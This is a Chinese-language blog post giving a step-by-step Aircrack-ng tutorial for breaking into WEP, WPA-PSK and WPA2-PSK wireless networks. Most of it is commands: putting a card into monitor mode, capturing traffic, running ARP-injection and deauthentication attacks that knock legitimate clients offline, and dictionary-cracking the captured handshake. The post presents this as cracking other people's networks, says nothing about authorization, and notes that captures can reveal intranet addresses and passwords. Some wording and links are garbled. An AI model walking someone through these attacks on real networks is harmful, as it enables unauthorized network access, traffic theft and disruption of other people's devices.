---
layout: post
title: Aircrack-ng 使用
category: Auxiliary
tags: [Aircrack-ng, Kali]
latest: 2015年10月27日 23:24:15
---

无线在使用方便的同时，也为各种破解带来了便利，因为现在使用无线的设备越来越多，抓包的难度也降低了不少。


WEP Crack
-

1、 载入无线网卡

```
ifconfig -a
```

2、 激活无线网卡

```
ifconfig wlan0 up
iwconfig
```

3、 切换无线网卡到工作模式为 **监听**

```
airmon-ng start wlan0
```

4、 预探测无线网络概况

```
airodump-ng mon0
```

> _mon0_ 为之前已经载入并激活监听模式的无线网卡。

5、 锁定攻击目标

```
airodump-ng --ivs –w longas -c 6 wlan0
```

6、 对目标 AP 使用 ArpRequest 注入攻击以加快抓包速度

```
aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 
```

7、 回到 airodump-ng 界面查看目标 AP 到数据包情况

8、 对抓取到的数据包进行 WEB 破解

```
aircrack-ng 捕获的ivs文件
```

> 在抓取的无线数据报文达到了一定数量后，一般都是指IVs值达到2万以上时，就可以开始破解，若不能成功，比如密码难度较大，就等待数据报文的继续抓取然后多试几次。

如果破解成功，在 "KEY FOUND" 字样后面的 "ASCII" 字符串即为密码。

9、 **补充**

- 捕获所有数据包而非过滤之后的IVs

这样的话，捕获的数据包将不再是longas-01、ivs，而是longas-01、cap。

> 若只是为了破解的话，建议保存为ivs，优点是生成文件小且效率高。若是为了破解后同时来对捕获的无线数据包分析的话，就选为cap，这样就能及时作出分析，比如内网IP地址、密码等，当然，缺点就是文件会比较大。可以使用 `du` 指令来比较两者的大小。

破解 、cap 数据包也是使用 aircrack-ng 指令：

```
aircrack-ng 捕获的cap文件
```

WPA-PSK Crack
-

1、 工具升级

升级 Aircrack-ng 。同时，为了更好地识别出无线网络设备及环境，最好对airodump-ng的OUI库进行升级，先进入到Aircrack-ng的安装目录下，然后输入命令如下：

```
airodump-ng-oui-update 
```

2、 载入并激活无线网卡至monitor即监听模式

```
startx            进入到图形界面 
ifconfig –a       查看无线网卡状态
ifconfig  wlan0  up     载入无线网卡驱动
airmon-ng  start  wlan0  激活网卡到monitor模式
```
3、 探测无线网络并对目标 AP 抓包

```
airodump-ng -c 6 –w longas mon0 
```

4、 进行Deauth攻击加速破解过程

> 和破解WEP时不同，这里为了获得破解所需的WPA-PSK握手验证的整个完整数据包，无线黑客们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，黑客们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。此处具体输入命令如下：

```
aireplay-ng -0 1 –a AP的mac -c 客户端的mac wlan0
```

若我们没有在airodump-ng工作的界面上看到上面的提示，那么可以增加Deauth的发送数量，再一次对目标AP进行攻击。比如将-0参数后的数值改为10。

5、 开始破解 WPA-PSK 报文

```
aircrack-ng -w dic 捕获的cap文件 
```

WAP2-PSK Crack
-

对于启用WPA2-PSK加密的无线网络，其攻击和破解步骤及工具是完全一样的，不同的是，在使用airodump-ng进行无线探测的界面上，会提示为 WPA CCMP PSK。

参考
-

- <netsecurity.51cto.com/art/201105/264844_all.htm>

- [_无线破解攻击工具Aircrack-ng使用详解_](http://blog、csdn、net/ffilman/article/details/5782577)
